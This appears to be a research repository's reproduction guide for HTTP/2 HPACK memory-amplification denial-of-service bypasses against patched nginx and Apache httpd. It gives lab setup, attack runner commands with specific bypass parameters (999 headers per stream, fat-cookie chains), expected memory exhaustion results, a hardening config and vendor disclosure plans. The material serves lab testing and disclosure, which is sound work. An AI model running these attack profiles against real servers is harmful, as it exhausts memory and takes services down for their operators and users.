# HTTP/2 HPACK Patch-Bypass — Reproduction Guide

Authorized lab reproduction of HTTP/2 HPACK amplification on **patched** reverse proxies (nginx ≥ 1.29.8, Apache httpd mod_http2 ≥ 2.0.41).

This document consolidates the 2026-06-17 research session. Raw benchmark logs stay local under `lab-replay/logs/` (gitignored).

---

## Summary

| Stack | Patched version | Original PoC | Bypass technique | Typical wire | Peak / OOM |
|-------|-----------------|--------------|------------------|--------------|------------|
| **nginx** | 1.31.1 | 32k hdr → GOAWAY | **999 hdr/stream** + connection scale | 25–57 MB | 4–8 GiB RSS |
| **nginx hardened** | 1.31.1 + `max_headers 100` | — | 99 hdr/stream — **mitigation test** | low | blocked / limited |
| **httpd** | 2.4.68 / mod_http2 2.0.41 | empty cookie → blocked | **Fat-cookie chain** | 200–360 MB | 4.7+ GiB RSS |

**CVE candidate (strongest):** Apache mod_http2 incomplete fix of CVE-2026-49975 — fat non-empty cookie crumbs still amplify under `LimitRequestFields`. See `docs/disclosure/VENDOR-REPORT-APACHE-CVE-CANDIDATE.md`.

---

## Prerequisites

- Docker
- Python 3.11+
- `./scripts/verify.sh` dependencies (`requirements-dev.txt`)

```bash
git clone <repo> && cd APEX-Ngin2dos
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements-dev.txt -r requirements.txt
```

---

## Lab topology

| Lab | Path | Port | Stack |
|-----|------|------|-------|
| Vulnerable nginx | `lab-replay/` | 8443 | nginx 1.24 |
| Patched nginx | `lab-replay-patched/` | **8445** | nginx:latest (default `max_headers` 1000) |
| Hardened nginx | `lab-replay-patched/` + `VARIANT=hardened` | **8446** | `max_headers 100` |
| Patched httpd | `lab-replay-httpd/` | 10080 | httpd 2.4.68 |
| Vulnerable httpd | `lab-replay-httpd-vuln/` | 10081 | httpd 2.4.62 (baseline only) |

---

## nginx directive (important)

nginx **1.29.8+** introduced **`max_headers`**. The name `http2_max_headers` is **not** valid on current nginx — configs using it fail to start:

```
nginx: [emerg] unknown directive "http2_max_headers"
```

Use:

```nginx
http {
    max_headers 100;
}
```

Reference: [nginx commit 3656941](https://github.com/nginx/nginx/commit/365694160a85229a7cb006738de9260d49ff5fa2)

Example hardened config: `lab-replay-patched/nginx-hardened.conf`, `hardening/nginx-1.29.8-post-upgrade.conf`.

---

## Reproduction: patched nginx bypass

```bash
./lab-replay-patched/replay.sh build
./lab-replay-patched/replay.sh start 8g

cd benchmark
python3 -c "
from attack_config import profile_patch_bypass_nginx
from attack_runner import run_attack
run_attack('bypass', '127.0.0.1', 8445, 200, cfg=profile_patch_bypass_nginx(999), variant='nginx')
"
```

**Profile:** `profile_patch_bypass_nginx(999)` — 999 headers/stream (under default limit 1000), 128 streams, `hard_hold`, batched bomb.

**Expected:** Most connections succeed; worker RSS climbs (often >1 GiB at 200 conn); `oom_likely=true` at higher connection counts.

Automated campaign:

```bash
python3 benchmark/patch_bypass_runner.py --target nginx
```

---

## Reproduction: hardened nginx verification

```bash
VARIANT=hardened ./lab-replay-patched/replay.sh build
VARIANT=hardened ./lab-replay-patched/replay.sh start 8g

cd benchmark
python3 -c "
from attack_config import profile_patch_bypass_nginx_hardened
from attack_runner import run_attack
run_attack('hardened_test', '127.0.0.1', 8446, 50, cfg=profile_patch_bypass_nginx_hardened(99), variant='nginx')
"
```

**Hardened verification (2026-06-17 smoke):** `max_headers 100` @ port 8446 — **0/50** bomb connections succeeded; default patched lab @ 8445 — **20/20** at 999 hdr/stream.

```bash
python3 benchmark/patch_bypass_runner.py --target nginx-hardened
```

---

## Reproduction: httpd fat-cookie bypass

```bash
./lab-replay-httpd/replay.sh start 8g

cd benchmark
python3 -c "
from attack_config import profile_patch_bypass_httpd_fat
from attack_runner import run_cookie_attack
run_cookie_attack('bypass', '127.0.0.1', 10080, 800, profile_patch_bypass_httpd_fat(800), variant_id='httpd')
"
```

**Why empty-cookie fails on patched httpd:** mod_http2 2.0.41 counts merged cookie crumbs against `LimitRequestFields`; empty crumbs no longer amplify.

**Bypass:** `build_httpd_fat_block()` in `cookie_bomb_enhanced.py` — 4058-byte values, 95 refs/stream (under limit 100).

---

## One-shot smoke test

```bash
chmod +x scripts/verify-patch-bypass.sh
./scripts/verify-patch-bypass.sh
```

Runs unit tests, validates nginx configs, builds both labs, and fires small authorized probes.

---

## APEX v2 vs original califio PoC

See `docs/APEX_VS_POC_DIFFERENCES.md` — batched parallel bombs, `hard_hold`, cookie variants, connection scaling.

---

## Vendor disclosure

| Document | Purpose |
|----------|---------|
| `docs/disclosure/VENDOR-REPORT-APACHE-CVE-CANDIDATE.md` | Apache security report draft |
| `docs/disclosure/VENDOR-REPORT-NGINX-CVE-CANDIDATE.md` | nginx report draft |
| `docs/disclosure/CVE-SUBMISSION-GUIDE.md` | CVE submission workflow |
| `docs/disclosure/EMAIL-APACHE-DRAFT.txt` | Email template |

---

## Safety

- **Authorized targets only** — labs bind to `127.0.0.1`.
- Do not run against production without explicit written authorization.
- Container memory cap (`8g`) prevents host OOM; attacks can still stress the Docker host.

---

*Research artifact — APEX-Ngin2dos, 2026-06-17.*
